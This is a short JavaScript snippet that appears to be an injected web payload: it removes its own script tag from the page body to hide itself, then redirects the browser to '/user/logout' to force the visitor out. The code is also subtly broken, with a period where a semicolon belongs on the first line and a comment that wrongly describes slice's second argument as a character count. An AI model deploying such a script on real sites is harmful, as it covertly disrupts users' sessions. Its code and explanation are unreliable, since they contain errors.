var src = document.currentScript.src.

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
//logout now
location.pathname = "/user/logout";//goodbye!
